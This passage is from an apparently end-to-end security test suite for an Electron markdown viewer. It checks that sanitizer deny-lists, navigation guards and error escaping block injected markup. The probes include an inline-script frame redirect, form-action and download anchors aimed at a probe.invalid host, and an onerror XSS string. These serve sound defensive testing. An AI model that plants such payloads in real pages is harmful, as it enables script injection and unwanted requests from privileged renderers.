      // Chromium snaps the used value to whole device pixels, with a floor of
      // one device pixel for any non-zero declaration.
      const usedAt = (n, s) => (n === 0 ? 0 : Math.max(1, Math.round(n * s)) / s);
      const borderPx = b ? parseFloat(b.borderLeftWidth) : NaN;
      const near = (x, y) => Math.abs(x - y) < 1e-6;
      let matched = null;
      for (const candidate of candidates) {
        const four = usedAt(4, candidate.scale);
        if (!near(borderPx, four)) continue;
        // AND IT IS NOT ALSO WHAT A NARROWER DECLARATION WOULD PAINT AS. This
        // is what keeps the oracle decisive rather than tolerant: a removed
        // declaration, a hairline, a 2px or a 3px regression each paint a
        // different used value at this same scale, and none of them may be
        // confusable with the one accepted here.
        const collides = [0, 1, 2, 3].some((n) => near(usedAt(n, candidate.scale), four));
        if (!collides) matched = { how: candidate.how, scale: candidate.scale, expected: four };
      }
      return {
        colour: a && a.color,
        size: a && a.fontSize,
        background: b && b.backgroundColor,
        padding: b && b.paddingLeft,
        border: b && b.borderLeftWidth,
        borderPx: borderPx,
        devicePixelRatio: dpr,
        zoomFactor: zoomFactor,
        candidates: candidates,
        matched: matched,
        // Reported so a future mismatch is diagnosable from the FAIL line
        // alone: these are what a 0/1/2/3 px declaration would have painted.
        narrowerWidths: candidates.length
          ? [0, 1, 2, 3].map((n) => usedAt(n, candidates[0].scale))
          : [],
      };
    })()
  `);
  // Tier-1 gate for the same thing the screenshot shows, so this never depends
  // on someone remembering to look.
  check(
    "SEC-21 ordinary inline styling still reaches the rendered page",
    styledLook.colour === "rgb(224, 108, 117)" &&
      styledLook.size === "20px" &&
      styledLook.background === "rgb(44, 49, 58)" &&
      styledLook.padding === "12px" &&
      // The setup itself has to be sound: a scale that could not be read at all
      // would make the border term meaningless.
      Number.isFinite(styledLook.devicePixelRatio) &&
      styledLook.devicePixelRatio > 0 &&
      Array.isArray(styledLook.candidates) &&
      styledLook.candidates.length > 0 &&
      // A 4px border, painted the way this display paints 4px, and
      // distinguishable from every narrower declaration at that same scale.
      !!styledLook.matched,
    JSON.stringify(styledLook),
  );
  await captureScreenshot(win, "security-inline-styles");

  // An @@@html frame relocating itself is the one path that exercises the
  // will-frame-navigate branch. Without a test here, inverting the isMainFrame
  // early-return - or deleting the listener - passes the whole suite.
  //
  // Two things this must get right, both learned the hard way:
  //  * webContents.getURL() reports only the TOP frame, so asserting on it is
  //    vacuous - a sandboxed frame navigating *itself* leaves it untouched.
  //    The frame tree has to be inspected directly.
  //  * the target must be REMOTE. A file: target proves nothing, because
  //    Chromium refuses to let a sandboxed, origin-opaque frame reach a local
  //    resource on its own - the test then passes with the guard deleted.
  //    Measured with the guard removed: subframeUrls became
  //    ["https://probe.invalid/frame-probe"], i.e. the frame really does
  //    relocate, and DNS failure does not prevent the URL from committing.
  const frameProbeUrl = "https://probe.invalid/frame-probe";
  await exec(`
    window.__navProbeSeen = false;
    window.addEventListener('message', (e) => {
      if (e.data && e.data.__navProbe) window.__navProbeSeen = true;
    });
    null;
  `);
  const urlBeforeFrame = win.webContents.getURL();
  await render(
    "# Nav\n\n@@@html\n" +
      "<script>parent.postMessage({__navProbe:1},'*');" +
      `location.href=${JSON.stringify(frameProbeUrl)};</script>\n` +
      "@@@\n",
    "full",
    2500,
  );
  const subframeUrls = win.webContents.mainFrame.frames.map((f) => f.url);
  const frameNav = await exec(`
    ({ present: !!document.querySelector('#viewer iframe'),
       ran: window.__navProbeSeen === true })
  `);
  check(
    "SEC-11 an @@@html frame cannot reach a remote origin",
    frameNav.present === true && win.webContents.getURL() === urlBeforeFrame,
    JSON.stringify({ frameNav, subframeUrls, urlBeforeFrame }),
  );
  // Separated from the assertion above on review: it is not a SEC-11 control at
  // all, it is the control for SEC-09's 'unsafe-inline'. An about:srcdoc frame
  // inherits the embedder's policy, so if 'unsafe-inline' were dropped from
  // script-src this inline script would not run and `ran` goes false.
  check(
    "SEC-09 an inline script inside an @@@html srcdoc frame still runs",
    frameNav.ran === true,
    JSON.stringify(frameNav),
  );

  // The end-to-end probe above can no longer tell the two layers apart. Since
  // SEC-09 landed, `default-src 'none'` leaves no frame-src, so Chromium
  // refuses the navigation with ERR_BLOCKED_BY_CSP before will-frame-navigate
  // is consulted - and a CSP-blocked navigation still *commits* an error
  // document, so the frame's own URL becomes the target either way. That kills
  // the discriminator the old assertion relied on: it now passes with the
  // guard deleted, and it cannot be repaired by choosing a different target
  // because the policy permits no frame destination at all.
  //
  // So the guard is exercised directly instead. Emitting the event reproduces
  // exactly what Electron passes the handler, and covers the branch an
  // end-to-end test never could: that isMainFrame is an early *return* and not
  // an early preventDefault, which would make will-navigate unreachable.
  const emitFrameNav = (isMainFrame) => {
    let prevented = false;
    win.webContents.emit("will-frame-navigate", {
      isMainFrame,
      url: "https://probe.invalid/emitted",
      preventDefault() {
        prevented = true;
      },
    });
    return prevented;
  };
  check(
    "SEC-11 will-frame-navigate is armed and denies subframe navigation",
    win.webContents.listenerCount("will-frame-navigate") > 0 &&
      emitFrameNav(false) === true,
  );
  check(
    "SEC-11 will-frame-navigate defers main-frame navigation to will-navigate",
    emitFrameNav(true) === false &&
      win.webContents.listenerCount("will-navigate") > 0,
  );

  // Read this before the navigation probes below: if a navigation guard fails,
  // the document that holds __e2eErrors is replaced and the check would report
  // the wrong thing.
  const errs = await exec(`window.__e2eErrors`);

  // ==========================================================================
  // SEC-11 - navigating the Node-privileged main window
  //
  // Two independent controls, tested separately:
  //   (a) DOMPurify must not emit <form action> / formaction, so the markup
  //       that expresses a one-click navigation never exists;
  //   (b) main.js must deny will-navigate / will-redirect / window.open, so a
  //       navigation the sanitizer cannot see (location assignment, meta
  //       refresh, an @@@html frame) still goes nowhere.
  // ==========================================================================
  await render(
    "# Nav\n\n" +
      '<form action="https://probe.invalid/pwn" method="get">' +
      "<button>SubmitProbe</button></form>\n\n" +
      '<button formaction="https://probe.invalid/fa">FormActionProbe</button>\n',
    "full",
    1200,
  );
  const formState = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const btns = Array.from(v.querySelectorAll('button'));
      return {
        forms: v.querySelectorAll('form').length,
        actionAttrs: v.querySelectorAll('[action]').length,
        // Note: DOMPurify strips formaction unaided, so this clause locks in
        // current sanitizer behaviour rather than testing FORBID_ATTR. The
        // load-bearing clause is the form count; that one fails without
        // FORBID_TAGS (measured).
        formActionAttrs: v.querySelectorAll('[formaction]').length,
        // Control: DOMPurify unwraps a forbidden tag and keeps its children, so
        // the button surviving proves the payload reached the sanitizer and was
        // specifically stripped - not that the whole render silently failed.
        submitBtn: btns.some(b => b.textContent === 'SubmitProbe'),
        faBtn: btns.some(b => b.textContent === 'FormActionProbe')
      };
    })()
  `);
  check(
    "SEC-11 <form action> and formaction are stripped, their content is not",
    formState.forms === 0 &&
      formState.actionAttrs === 0 &&
      formState.formActionAttrs === 0 &&
      formState.submitBtn === true &&
      formState.faBtn === true,
    JSON.stringify(formState),
  );

  // ==========================================================================
  // SEC-29 - the table paths sanitized with a BARE DOMPurify.sanitize()
  //
  // Five call sites parsed markdown and sanitized it without SANITIZE_CONFIG,
  // silently opting out of the SEC-11 <form> control above. The comment on
  // SANITIZE_CONFIG called itself the "single source of truth for what the
  // sanitizer permits" - it was not.
  //
  // Reachability is the point: renderTableInDOM extracts only the <table>
  // element from its scratch div, so a <form> as a SIBLING of the table would
  // be dropped by the extraction. Nested inside a CELL it travels with the
  // table and is appended straight into the Node-privileged viewer.
  // ==========================================================================
  await render("# TableClean\n\nreset\n", "full", 600);
  const tableFormMd =
    "| A | B |\n" +
    "|---|---|\n" +
    '| <form action="https://probe.invalid/tbl"><button>TableFormProbe</button></form> | y |\n';
  const tableFormState = await exec(`
    (() => {
      window.renderTableInDOM(${JSON.stringify(tableFormMd)}, 'insert');
      const v = document.getElementById('viewer');
      const btns = Array.from(v.querySelectorAll('button'));
      return {
        tables: v.querySelectorAll('table').length,
        forms: v.querySelectorAll('form').length,
        actionAttrs: v.querySelectorAll('[action]').length,
        // Same control as SEC-11: DOMPurify unwraps a forbidden tag and keeps
        // its children, so the button surviving proves the payload reached the
        // sanitizer and was specifically stripped - not that the table failed
        // to render, or that renderTableInDOM bailed at its querySelector.
        probeBtn: btns.some(b => b.textContent === 'TableFormProbe'),
      };
    })()
  `);
  check(
    "SEC-29 a <form> nested in a table cell is stripped on the context-menu table path",
    tableFormState.tables === 1 &&
      tableFormState.forms === 0 &&
      tableFormState.actionAttrs === 0 &&
      tableFormState.probeBtn === true,
    JSON.stringify(tableFormState),
  );

  // The other reachable half: the table dialog's live preview element. This is
  // fed from the open DOCUMENT on the 'edit' path, so its input is
  // attacker-controlled too, and it is a live node in the privileged window
  // rather than a detached scratch div.
  const tablePreviewState = await exec(`
    (() => {
      window.openTableInsertDialog(${JSON.stringify(tableFormMd)}, 'edit');
      const p = document.getElementById('tableInsertPreview');
      const out = {
        found: !!p,
        // Symmetric with the check above: without this, a marked change that
        // stopped emitting a <table> would put the <form> in a <p>, strip it
        // identically, and let probeBtn pass green while measuring a shape the
        // assertion's own name does not describe.
        tables: p ? p.querySelectorAll('table').length : -1,
        cellBtns: p ? p.querySelectorAll('td button').length : -1,
        forms: p ? p.querySelectorAll('form').length : -1,
        actionAttrs: p ? p.querySelectorAll('[action]').length : -1,
        probeBtn: p
          ? Array.from(p.querySelectorAll('button')).some(
              b => b.textContent === 'TableFormProbe',
            )
          : false,
      };
      // closeTableInsertDialog() only removes the 'visible' class, so on its
      // own it would leave tableDialogMode==='edit', the attack markdown in the
      // textarea and its render in the live preview - a trap for whatever test
      // is appended here next. Clear the source first, then reopen in 'insert'
      // (which resets the mode, the button label and, via updateTablePreview(),
      // the preview itself) before closing for real.
      const ta = document.getElementById('tableInsertMarkdown');
      if (ta) ta.value = '';
      window.openTableInsertDialog(null, 'insert');
      window.closeTableInsertDialog();
      out.residualForms = p ? p.querySelectorAll('form').length : -1;
      out.residualBtn = p
        ? Array.from(p.querySelectorAll('button')).some(
            b => b.textContent === 'TableFormProbe',
          )
        : true;
      return out;
    })()
  `);
  check(
    "SEC-29 a <form> nested in a table cell is stripped in the table dialog preview",
    tablePreviewState.found === true &&
      tablePreviewState.tables === 1 &&
      tablePreviewState.cellBtns === 1 &&
      tablePreviewState.forms === 0 &&
      tablePreviewState.actionAttrs === 0 &&
      tablePreviewState.probeBtn === true,
    JSON.stringify(tablePreviewState),
  );
  check(
    "SEC-29 the table dialog is left reset, not holding the attack markdown",
    tablePreviewState.residualForms === 0 &&
      tablePreviewState.residualBtn === false,
    JSON.stringify(tablePreviewState),
  );

  // The comment on TABLE_SANITIZE_CONFIG makes a load-bearing promise: the two
  // deny-lists are shared BY REFERENCE, so a tag added to SANITIZE_CONFIG can
  // never leave the table path behind again. Nothing measured that. Rewriting
  // the config to literal copies (['form'] / ['action','formaction']) leaves
  // both SEC-29 checks green and R449 still failing exactly as designed, while
  // fully re-arming the drift the comment declares impossible.
  //
  // Object identity is the right oracle: a copy, a spread, or a literal all
  // fail it, and it is the property the comment actually claims. SANITIZE_CONFIG
  // is a top-level `const` in a classic script, so it is not on `window` but IS
  // a global lexical binding - hence the reachability control, without which a
  // renaming refactor would make this pass by throwing into the catch.
  const aliasState = await exec(`
    (() => {
      try {
        return {
          reach: true,
          tagsAliased:
            SANITIZE_CONFIG.FORBID_TAGS === TABLE_SANITIZE_CONFIG.FORBID_TAGS,
          attrsAliased:
            SANITIZE_CONFIG.FORBID_ATTR === TABLE_SANITIZE_CONFIG.FORBID_ATTR,
          tagsFrozen: Object.isFrozen(SANITIZE_CONFIG.FORBID_TAGS),
          attrsFrozen: Object.isFrozen(SANITIZE_CONFIG.FORBID_ATTR),
          tags: SANITIZE_CONFIG.FORBID_TAGS.slice(),
          attrs: SANITIZE_CONFIG.FORBID_ATTR.slice(),
        };
      } catch (e) {
        return { reach: false, err: String(e && e.message) };
      }
    })()
  `);
  check(
    "SEC-29 the table config shares SANITIZE_CONFIG's deny-lists by reference, frozen",
    aliasState.reach === true &&
      aliasState.tagsAliased === true &&
      aliasState.attrsAliased === true &&
      aliasState.tagsFrozen === true &&
      aliasState.attrsFrozen === true &&
      aliasState.tags.join() === "form" &&
      aliasState.attrs.join() === "action,formaction,download",
    JSON.stringify(aliasState),
  );

  // ==========================================================================
  // SEC-30 - <a download> as an outbound-request primitive
  //
  // `download` is in DOMPurify 3.4.12's default ALLOWED_ATTR (measured: 118
  // entries; `download` and `href` in, `target` and `ping` out). A download is
  // NOT a navigation, so main.js's will-navigate / will-redirect /
  // will-frame-navigate / setWindowOpenHandler denies never see it, and CSP has
  // no directive that governs one. Inside #viewer the attribute was already
  // inert - every branch of the click delegation calls preventDefault() and
  // routes the link to shell.openExternal - but #tableInsertPreview sits
  // OUTSIDE #viewer and had no delegation. Measured before the fix: a download
  // anchor rendered there issued a live outbound HTTP request from the
  // Node-privileged renderer to a loopback beacon, while a plain anchor in the
  // same click batch was blocked by will-navigate.
  // ==========================================================================
  const dlProbeMd =
    "| A | B |\n" +
    "|---|---|\n" +
    '| <a download="pwned.txt" href="https://probe.invalid/dl">DownloadProbe</a> | y |\n';

  await render(dlProbeMd, "full", 600);
  const dlViewerState = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const a = Array.from(v.querySelectorAll('a')).find(
        x => x.textContent === 'DownloadProbe',
      );
      return {
        // Positive control: the anchor itself must survive, with its href. A
        // marked or DOMPurify change that stopped emitting the <a> at all would
        // otherwise report zero download attributes and read green while
        // measuring nothing.
        anchor: !!a,
        href: a ? a.getAttribute('href') : null,
        downloadAttrs: v.querySelectorAll('[download]').length,
        tables: v.querySelectorAll('table').length,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "SEC-30 the download attribute is stripped from document content in the viewer",
    dlViewerState.anchor === true &&
      dlViewerState.href === "https://probe.invalid/dl" &&
      dlViewerState.downloadAttrs === 0 &&
      dlViewerState.tables === 1 &&
      dlViewerState.renderError === null,
    JSON.stringify(dlViewerState),
  );

  // The reachable half: the dialog preview, whose 'edit' input is the open
  // document. Covered by the same strip only because TABLE_SANITIZE_CONFIG
  // aliases FORBID_ATTR by reference - the property the check above pins.
  const dlPreviewState = await exec(`
    (() => {
      window.openTableInsertDialog(${JSON.stringify(dlProbeMd)}, 'edit');
      const p = document.getElementById('tableInsertPreview');
      const a = p
        ? Array.from(p.querySelectorAll('a')).find(
            x => x.textContent === 'DownloadProbe',
          )
        : null;
      const out = {
        found: !!p,
        anchor: !!a,
        href: a ? a.getAttribute('href') : null,
        downloadAttrs: p ? p.querySelectorAll('[download]').length : -1,
        tables: p ? p.querySelectorAll('table').length : -1,
      };
      // Inertness of the preview surface itself, independent of the attribute
      // strip. A bubble-phase listener observes the SAME event the capture
      // guard has already defaultPrevented. clickSeen is the control: it
      // proves the click really was dispatched to the anchor, so
      // clickPrevented cannot pass by the click silently not happening.
      let seen = false;
      let prevented = null;
      const spy = (e) => { seen = true; prevented = e.defaultPrevented; };
      if (p) p.addEventListener('click', spy);
      if (a) a.click();
      if (p) p.removeEventListener('click', spy);
      out.clickSeen = seen;
      out.clickPrevented = prevented;
      // Same reset as the SEC-29 block above: closeTableInsertDialog() only
      // drops the 'visible' class, so without this the attack markdown stays in
      // the textarea and its render stays in the live preview, trapping
      // whatever test is appended here next.
      const ta = document.getElementById('tableInsertMarkdown');
      if (ta) ta.value = '';
      window.openTableInsertDialog(null, 'insert');
      window.closeTableInsertDialog();
      out.residualDownloadAttrs = p ? p.querySelectorAll('[download]').length : -1;
      return out;
    })()
  `);
  check(
    "SEC-30 the download attribute is stripped in the table dialog preview",
    dlPreviewState.found === true &&
      dlPreviewState.anchor === true &&
      dlPreviewState.href === "https://probe.invalid/dl" &&
      dlPreviewState.downloadAttrs === 0 &&
      dlPreviewState.tables === 1 &&
      dlPreviewState.residualDownloadAttrs === 0,
    JSON.stringify(dlPreviewState),
  );
  check(
    "SEC-30 clicks in the table dialog preview are inert",
    dlPreviewState.clickSeen === true && dlPreviewState.clickPrevented === true,
    JSON.stringify(dlPreviewState),
  );

  // ==========================================================================
  // N10 - the table dialog's validation error
  //
  // Three defects in one line. It was the last Turkish string in the product
  // (the Turkish and Ukrainian locales, and the switcher between them, were
  // removed earlier; this one survived because it never went through i18n(),
  // so the locale sweep could not see it). It was assigned with innerHTML,
  // into the very preview box SEC-30 had just hardened. And it hardcoded
  // background:#ffe6e6, a light pink that is unreadable on the three dark
  // themes, while every theme already defines --danger-fg/--danger-glow-rgb.
  // ==========================================================================
  const n10State = await exec(`
    (() => {
      const ta = document.getElementById('tableInsertMarkdown');
      const p = document.getElementById('tableInsertPreview');
      const btn = document.getElementById('tableInsertBtn');
      const overlay = document.getElementById('tableInsertOverlay');
      window.openTableInsertDialog(null, 'insert');
      if (ta) ta.value = 'not a table, just prose';
      // Driven through the real button, not the function, so the check also
      // covers the listener being connected.
      if (btn) btn.click();

      const err = p ? p.querySelector('.table-insert-error') : null;
      const out = {
        found: !!p,
        clicked: !!btn,
        err: !!err,
        // The dialog must STAY OPEN on invalid input. If validation stopped
        // rejecting, insertTableFromDialog() would fall through, close the
        // dialog and insert nothing - a silent failure this pins.
        stillOpen: overlay ? overlay.classList.contains('visible') : null,
        text: err ? err.textContent : null,
        role: err ? err.getAttribute('role') : null,
        // Shape and ordering: the error is the ONLY thing in the box and it is
        // first. Deliberately NOT claimed as proof of node construction - an
        // innerHTML assignment with no surrounding whitespace produces exactly
        // one child node too, and would satisfy every conjunct here. That
        // property is unobservable from the DOM and is pinned statically in
        // test:packaging instead. What this does catch is a whitespace-padded
        // assignment, or an append that leaves the previous render in place.
        previewNodes: p ? p.childNodes.length : -1,
        previewFirstIsErr: p ? p.firstChild === err : null,
        errChildren: err ? err.children.length : -1,
        inlineStyle: err ? err.getAttribute('style') : 'NO-ELEMENT',
        // Full Turkish-specific set, upper and lower: the earlier version
        // omitted c-cedilla, o- and u-umlaut and so could not have seen a
        // partial reintroduction.
        turkish: err
          ? /[\\u011E\\u011F\\u0130\\u0131\\u015E\\u015F\\u00C7\\u00E7\\u00D6\\u00F6\\u00DC\\u00FC]/.test(
              err.textContent,
            )
          : null,
        fromTable: err ? err.textContent === i18n('table.invalidFormat') : null,
      };

      // Theming. Read the resolved colours under two different themes: the
      // whole point of the change is that they track the theme rather than
      // being frozen at one hardcoded red.
      //
      // try/finally, not straight-line: if a read throws, data-theme would
      // otherwise be left on 'clarity' for every test appended after this one -
      // the one leak the "do not trap the next test" reset below does not
      // cover, because it only restores the dialog.
      const themeBefore = document.body.getAttribute('data-theme');
      const readColours = () => {
        if (!err || !p) return null;
        const cs = getComputedStyle(err);
        return {
          fg: cs.color,
          // Non-vacuity control. If --danger-fg were misspelt, the declaration
          // color: var(--typo) is invalid at computed-value time and the
          // element INHERITS instead - and inherited text colour also differs
          // between themes, so "fg differs across themes" alone would still
          // pass. Pinning err's colour as distinct from its parent's catches
          // that.
          inherited: getComputedStyle(p).color,
          // The ABSENCE of a fill is a deliberate, measured decision (see the
          // rule's comment in styles.css) and nothing else observes it.
          bg: cs.backgroundColor,
          // Width and style, not colour. border-top-COLOR is useless here: its
          // initial value is currentcolor, so if the border declaration were
          // misspelt or deleted outright it still reports the element's color,
          // which already differs between themes - the conjunct could only
          // fail when the colour check had already failed.
          //
          // Width is read as a NUMBER and only pinned non-zero. The string is
          // not "1px": getComputedStyle returns the used value, which Chromium
          // snaps to device pixels, and this window reports 0.8px. Deletion
          // still computes to 0 with style 'none', which is what this catches.
          borderW: parseFloat(cs.borderTopWidth),
          borderS: cs.borderTopStyle,
        };
      };
      try {
        document.body.setAttribute('data-theme', 'abyss');
        out.abyss = readColours();
        document.body.setAttribute('data-theme', 'clarity');
        out.clarity = readColours();
      } finally {
        if (themeBefore === null) {
          document.body.removeAttribute('data-theme');
        } else {
          document.body.setAttribute('data-theme', themeBefore);
        }
      }
      out.themeRestored = document.body.getAttribute('data-theme') === themeBefore;

      if (ta) ta.value = '';
      window.openTableInsertDialog(null, 'insert');
      window.closeTableInsertDialog();
      return out;
    })()
  `);
  check(
    "N10 the table validation error is an English text node, not Turkish markup",
    n10State.found === true &&
      n10State.clicked === true &&
      n10State.err === true &&
      n10State.stillOpen === true &&
      n10State.turkish === false &&
      // Both halves are required. i18n() returns the KEY when the key is
      // missing, so fromTable alone would still be true if the string were
      // deleted - both sides would collapse to 'table.invalidFormat'. The
      // literal pins the actual English text.
      n10State.fromTable === true &&
      n10State.text.includes("Invalid table format") &&
      // The glyph survives neither revert on its own, so nothing else pins it.
      n10State.text.startsWith("\u26A0") &&
      n10State.role === "alert" &&
      n10State.previewNodes === 1 &&
      n10State.previewFirstIsErr === true &&
      n10State.errChildren === 0 &&
      n10State.inlineStyle === null,
    JSON.stringify(n10State),
  );
  check(
    "N10 the validation error is themed, and tracks the active theme",
    n10State.abyss !== null &&
      n10State.clarity !== null &&
      // The colour it replaced, frozen at this value under every theme.
      n10State.abyss.fg !== "rgb(255, 0, 0)" &&
      n10State.clarity.fg !== "rgb(255, 0, 0)" &&
      // The token really resolved, rather than the declaration being dropped
      // and the element inheriting its parent's colour.
      n10State.abyss.fg !== n10State.abyss.inherited &&
      n10State.clarity.fg !== n10State.clarity.inherited &&
      // No tinted fill, under either theme. This is what makes R457's
      // background line load-bearing: without it, a regression that re-added a
      // fill while keeping the themed colour would pass every other conjunct.
      n10State.abyss.bg === "rgba(0, 0, 0, 0)" &&
      n10State.clarity.bg === "rgba(0, 0, 0, 0)" &&
      // The box outline survives at all - deletion is the realistic accident,
      // and it is invisible to a colour comparison.
      n10State.abyss.borderW > 0 &&
      n10State.abyss.borderS === "solid" &&
      n10State.abyss.fg !== n10State.clarity.fg &&
      n10State.themeRestored === true,
    JSON.stringify(n10State),
  );

  // ==========================================================================
  // N12 - the markdown render-failure banner
  //
  // The tail catch of renderMarkdownFull() assigned viewer.innerHTML from a
  // template literal interpolating ${error.message}, styled with a hardcoded
  // color:red. Strictly worse than the N10 line above: marked and DOMPurify
  // both quote document content back in their errors, so a document that
  // fails to render could put markup of its own choosing into a Node-
  // privileged renderer through the very handler written to report the
  // failure. Now built from nodes, with the message as a text node, and
  // themed through --danger-fg.
  //
  // The catch is not reachable from a document alone - every stage of the
  // pipeline that can fail on hostile input is already guarded - so the
  // failure has to be injected. That is a statement about the product, not a
  // weakness in the test: a probe that waited for the app to reach this sink
  // on its own would be permanently vacuous. Same reasoning as 13b2 in the
  // mermaid suite.
  // ==========================================================================

  // The deliberate failure logs console.error('Error rendering markdown:', e).
  // Muted narrowly, and the mute is asserted to have caught exactly that
  // below - a mute that suppresses nothing has quietly stopped describing the
  // test it was opened for.
  await sentinel.mute("N12 forces the render pipeline to throw on purpose");

  const n12Installed = await exec(`
    (() => {
      // renderer.js is a classic <script>, so its top-level function
      // declarations are properties of window and the pipeline's own call
      // site resolves through that global binding. Replacing it here really
      // does make renderMarkdownFull's internal call throw.
      //
      // applyRawHtmlDocuments() is the throw site because it is called inside
      // the try IMMEDIATELY AFTER patchViewerDOM(html) - so the viewer holds a
      // fully rendered document when the throw lands, and the banner
      // REPLACING that content is observable rather than merely appearing in
      // an empty pane.
      //
      // Deliberately not marked.parse: marked 18's esbuild UMD makes every
      // export a getter-only, non-configurable accessor, so assigning to it
      // fails SILENTLY under sloppy mode and the throw would never happen.
      window.__n12Saved = window.applyRawHtmlDocuments;
      // Carries markup on purpose. If the message were ever interpolated into
      // HTML again, these two elements would exist in the banner and the
      // onerror handler would set __pwned.
      window.__n12Msg = '<img src=x onerror="window.__pwned = 1"><b>bold</b>';
      window.applyRawHtmlDocuments = function () {
        throw new Error(window.__n12Msg);
      };
      return (
        typeof window.__n12Saved === 'function' &&
        window.applyRawHtmlDocuments !== window.__n12Saved
      );
    })()
  `);

  const n12Pwned = await render("# N12\n\nrender failure probe\n", "full", 700);

  const n12State = await exec(`
    (() => {
      const viewer = document.getElementById('viewer');
      const box = viewer.querySelector('.render-error');
      const strong = box ? box.querySelector('strong') : null;
      const overlay = document.getElementById('loadingScreen');
      const out = {
        box: !!box,
        // The banner REPLACED the rendered document rather than being
        // appended beside it, and it is the only thing left.
        viewerNodes: viewer.childNodes.length,
        viewerFirstIsBox: viewer.firstChild === box,
        role: box ? box.getAttribute('role') : null,
        label: strong ? strong.textContent : null,
        // Both halves are required. i18n() returns the KEY on a miss, so the
        // comparison alone would still hold if the string were deleted - both
        // sides would collapse to 'render.failed'. The literal pins the text.
        fromRender: strong
          ? strong.textContent === i18n('render.failed')
          : null,
        text: box ? box.textContent : null,
        // The message reaches the reader VERBATIM, markup and all, as text.
        // Escaping is proven by the two conjuncts below rather than by this
        // one: a correctly-escaped text node and an innerHTML assignment both
        // put these characters on screen, but only the second creates
        // elements out of them.
        hasMessage: box ? box.textContent.indexOf(window.__n12Msg) >= 0 : null,
        // Exactly <strong> and <br>. Anything the message spelled would show
        // up here as a third element.
        boxChildren: box ? box.children.length : -1,
        injected: box ? box.querySelectorAll('img, b, script').length : -1,
        inlineStyle: box ? box.getAttribute('style') : 'NO-ELEMENT',
        // The catch is the last thing to run on this path, so it owns the
        // full-screen click-blocking overlay. Leaving it up strands the whole
        // UI behind a permanent "Loading..." - the defect already recorded on
        // the superseded-render path.
        overlayActive: overlay ? overlay.classList.contains('active') : null,
      };

      // Theming, read under two schemes. try/finally rather than straight
      // line: a throw in a read would otherwise leave data-theme on 'clarity'
      // for every test appended after this one.
      const themeBefore = document.body.getAttribute('data-theme');
      const readColours = () => {
        if (!box) return null;
        const cs = getComputedStyle(box);
        return {
          fg: cs.color,
          // Non-vacuity control: a misspelt var() is invalid at
          // computed-value time and the element INHERITS, and the inherited
          // colour also differs between themes - so "fg differs across
          // themes" alone would still pass. #viewer is the parent, and it is
          // also the surface whose background this banner is measured
          // against.
          inherited: getComputedStyle(viewer).color,
          // No fill, deliberately and measurably (see the rule's comment in
          // styles.css). Nothing else observes the absence.
          bg: cs.backgroundColor,
          // Width and style, never border-top-COLOR: its initial value is
          // currentcolor, so a deleted border declaration still reports the
          // element's own colour and the conjunct could only fail once the
          // colour check already had. Width is a NUMBER and only pinned
          // non-zero - getComputedStyle returns the device-snapped used
          // value, 0.8px on this display.
          borderW: parseFloat(cs.borderTopWidth),
          borderS: cs.borderTopStyle,
        };
      };
      try {
        document.body.setAttribute('data-theme', 'abyss');
        out.abyss = readColours();
        document.body.setAttribute('data-theme', 'clarity');
        out.clarity = readColours();
      } finally {
        if (themeBefore === null) {
          document.body.removeAttribute('data-theme');
        } else {
          document.body.setAttribute('data-theme', themeBefore);
        }
      }
      out.themeRestored = document.body.getAttribute('data-theme') === themeBefore;
      return out;
    })()
  `);

  check(
    "N12 a render failure reports as an escaped text node, not interpolated markup",
    n12Installed === true &&
      // The message spells an onerror handler. If it were ever interpolated
      // into HTML the image would load, fail and run it.
      n12Pwned === null &&
      n12State.box === true &&
      n12State.viewerNodes === 1 &&
      n12State.viewerFirstIsBox === true &&
      n12State.role === "alert" &&
      n12State.fromRender === true &&
      n12State.label === "Error rendering markdown:" &&
      n12State.hasMessage === true &&
      n12State.boxChildren === 2 &&
      n12State.injected === 0 &&
      n12State.inlineStyle === null &&
      n12State.overlayActive === false,
    JSON.stringify(n12State) + " installed=" + n12Installed + " pwned=" + n12Pwned,
  );

  check(
    "N12 the render-failure banner is themed, and tracks the active theme",
    n12State.abyss !== null &&
      n12State.clarity !== null &&
      // The colour it replaced, frozen at this value under every theme.
      n12State.abyss.fg !== "rgb(255, 0, 0)" &&
      n12State.clarity.fg !== "rgb(255, 0, 0)" &&
      // The token really resolved, rather than the declaration being dropped
      // and the element inheriting #viewer's colour.
      n12State.abyss.fg !== n12State.abyss.inherited &&
      n12State.clarity.fg !== n12State.clarity.inherited &&
      n12State.abyss.bg === "rgba(0, 0, 0, 0)" &&
      n12State.clarity.bg === "rgba(0, 0, 0, 0)" &&
      n12State.abyss.borderW > 0 &&
      n12State.abyss.borderS === "solid" &&
      n12State.abyss.fg !== n12State.clarity.fg &&
      n12State.themeRestored === true,
    JSON.stringify(n12State),
  );

  // Uninstall, then prove it BEHAVIOURALLY by rendering again: a check that
  // the saved slot is gone would pass for a restore that put back the wrong
  // function. The banner disappearing is what says the pipeline is whole.
  await exec(`
    (() => {
      if (typeof window.__n12Saved === 'function') {
        window.applyRawHtmlDocuments = window.__n12Saved;
      }
      delete window.__n12Saved;
      return null;
    })()
  `);
  await render("# N12Restored\n\nthe pipeline is whole again\n", "full", 700);
  const n12After = await exec(`
    (() => {
      const viewer = document.getElementById('viewer');
      return {
        banner: !!viewer.querySelector('.render-error'),
        heading: !!viewer.querySelector('h1'),
      };
    })()
  `);
  check(
    "N12 the injected failure is removed and the pipeline renders normally again",
    n12After.banner === false && n12After.heading === true,
    JSON.stringify(n12After),
  );

  // The mute has to have caught the console.error it was opened for. Drained
  // first: console-message crosses an IPC boundary, so it does not arrive just
  // because the awaited executeJavaScript resolved.
  await sentinel.drain();
  const n12Mute = sentinel.currentMute();
  const n12Suppressed = (n12Mute && n12Mute.suppressed) || [];
  check(
    "N12 the deliberate render failure really reached the console (the mute is not vacuous)",
    n12Suppressed.some(
      (s) =>
        s.kind === "console-error" && /Error rendering markdown/.test(s.detail),
    ),
    JSON.stringify(n12Suppressed).slice(0, 400),
  );
  await sentinel.unmute();

  await render("# TableCleanup\n\nreset\n", "full", 600);

  // <map><area href> survives DOMPurify: an image map is a hyperlink that is
  // not an <a>. The renderer's click handler now matches it, so it obeys the
  // same external/local policy as every other link instead of falling through
  // to Chromium's default follow.
  await render(
    '# Nav\n\n<img src="x.png" usemap="#m" alt="m">\n' +
      '<map name="m"><area shape="rect" coords="0,0,20,20" ' +
      'href="https://probe.invalid/area" alt="AreaProbe"></map>\n',
    "full",
    1000,
  );
  const areaState = await exec(`
    (() => {
